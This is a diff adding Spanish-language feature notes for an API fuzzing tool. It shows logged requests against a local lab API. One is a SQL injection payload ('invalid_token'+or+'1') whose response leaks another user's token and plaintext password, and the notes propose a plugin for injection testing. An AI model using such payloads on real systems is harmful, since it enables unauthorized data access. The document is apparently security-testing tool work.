@@ -1,0 +1,132 @@
+se coloca dos veces el header:
+
+./apileaks.py req GET "http://192.168.1.79/v1/users.php?format=json&username=securestore&password=securestore" --proxy http://127.0.0.1:8080
+
+      .o.       ooooooooo.   ooooo ooooo                            oooo
+     .888.      `888   `Y88. `888' `888'                            `888
+    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o
+   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8
+  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.
+ .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b
+o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P'
+
+APILeak v1.0.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
+
+
+      .o.       ooooooooo.   ooooo ooooo                            oooo
+     .888.      `888   `Y88. `888' `888'                            `888
+    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o
+   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8
+  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.
+ .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b
+o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P'
+
+APILeak v1.0.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
+
+2026-11-03 21:02:21 [info     ] Rate limiter initialized       adaptive=True burst_size=1000 component=rate_limiter rps=1000                                                                                        
+2026-11-03 21:02:21 [debug    ] User Agent Rotator initialized component=user_agent_rotator list_size=0 mode=default                                                                                                
+2026-11-03 21:02:21 [info     ] HTTP Request Engine initialized component=http_engine max_retries=1 proxy=http://127.0.0.1:8080 status_code_filter=None timeout=30.0 user_agent_mode=default verify_ssl=False       
+2026-11-03 21:02:21 [info     ] Routing HTTP traffic through proxy component=http_engine proxy=http://127.0.0.1:8080 verify_ssl=False                                                                               
+2026-11-03 21:02:21 [debug    ] HTTP client initialized        component=http_engine
+2026-11-03 21:02:21 [debug    ] Request permission acquired    component=rate_limiter current_rps=1000.0 tokens_remaining=999.0                                                                                     
+[+] HTTP Request: GET http://192.168.1.79/v1/users.php?format=json&username=securestore&password=securestore "HTTP/1.1 200 OK"                                                                                      
+2026-11-03 21:02:30 [debug    ] HTTP client closed             component=http_engine
+
+════════════════════════════════════════════════════════════
+  HTTP REQUEST                                                                                            
+════════════════════════════════════════════════════════════                                              
+GET /v1/users.php?format=json&username=securestore&password=securestore  HTTP/1.1
+Host: 192.168.1.79
+
+────────────────────────────────────────────────────────────
+  RESPONSE                                                                                                
+────────────────────────────────────────────────────────────                                              
+HTTP/1.1 200  (9.070s)
+content-length: 134
+content-type: application/json; charset=utf-8
+date: Wed, 04 Nov 2026 03:02:30 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.18 (Ubuntu)
+
+{
+  "code": 1,
+  "status": 200,
+  "data": {
+    "username": "securestore",
+    "emailid": "securestore@gmail.com",
+    "token": "212174768840da1c6a1604c8b485a0ee"
+  }
+}
+════════════════════════════════════════════════════════════
+
+2 - si encuentra en el reponse palabras ckaves como token, mfa, code etc deberia colorearlo
+pero tambien podria ser que el usuario pida que palabras clave quieren que se coloren si las encuentra en el response el color debe ser estandar como magenta o algo asi ese si no lo pordra modificar por ahora
+
+EJEMPLO DE SQL INJECTION LAB:
+
+./apileaks.py req GET "http://192.168.1.79/v1/users.php?format=json&token=invalid_token'+or+'1" --proxy http://127.0.0.1:8080 
+
+      .o.       ooooooooo.   ooooo ooooo                            oooo
+     .888.      `888   `Y88. `888' `888'                            `888
+    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o
+   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8
+  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.
+ .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b
+o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P'
+
+APILeak v1.0.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
+
+
+      .o.       ooooooooo.   ooooo ooooo                            oooo
+     .888.      `888   `Y88. `888' `888'                            `888
+    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o
+   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8
+  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.
+ .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b
+o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P'
+
+APILeak v1.0.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
+
+2026-11-03 21:10:54 [info     ] Rate limiter initialized       adaptive=True burst_size=1000 component=rate_limiter rps=1000                                                                                        
+2026-11-03 21:10:54 [debug    ] User Agent Rotator initialized component=user_agent_rotator list_size=0 mode=default                                                                                                
+2026-11-03 21:10:54 [info     ] HTTP Request Engine initialized component=http_engine max_retries=1 proxy=http://127.0.0.1:8080 status_code_filter=None timeout=30.0 user_agent_mode=default verify_ssl=False       
+2026-11-03 21:10:54 [info     ] Routing HTTP traffic through proxy component=http_engine proxy=http://127.0.0.1:8080 verify_ssl=False                                                                               
+2026-11-03 21:10:54 [debug    ] HTTP client initialized        component=http_engine
+2026-11-03 21:10:54 [debug    ] Request permission acquired    component=rate_limiter current_rps=1000.0 tokens_remaining=999.0                                                                                     
+[+] HTTP Request: GET http://192.168.1.79/v1/users.php?format=json&token=invalid_token'+or+'1 "HTTP/1.1 200 OK"                                                                                                     
+2026-11-03 21:10:54 [debug    ] HTTP client closed             component=http_engine
+
+════════════════════════════════════════════════════════════
+  HTTP REQUEST                                                                                            
+════════════════════════════════════════════════════════════                                              
+GET /v1/users.php?format=json&token=invalid_token'+or+'1  HTTP/1.1
+Host: 192.168.1.79
+
+────────────────────────────────────────────────────────────
+  RESPONSE                                                                                                
+────────────────────────────────────────────────────────────                                              
+HTTP/1.1 200  (0.037s)
+content-length: 150
+content-type: application/json; charset=utf-8
+date: Wed, 04 Nov 2026 03:10:54 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.18 (Ubuntu)
+
+{
+  "code": 1,
+  "status": 200,
+  "data": {
+    "username": "attacker",
+    "emailid": "attacker@gmail.com",
+    "token": "3f858cf8cfd59f25010e71b6b5671428",
+    "password": "attacker"
+  }
+}
+════════════════════════════════════════════════════════════
+
+Pudieramos agregar alguna funcion que pruebe sqlinejtion en algunparametros
+
+
+./apileaks.py req GET "http://192.168.1.79/v1/users.php?format=json&token=invalid_token'+or+'1" --plugin sqlinjection --parameters "token=" --proxy http://127.0.0.1:8080
+
+o declarar una lista de pamaremtros tambien.
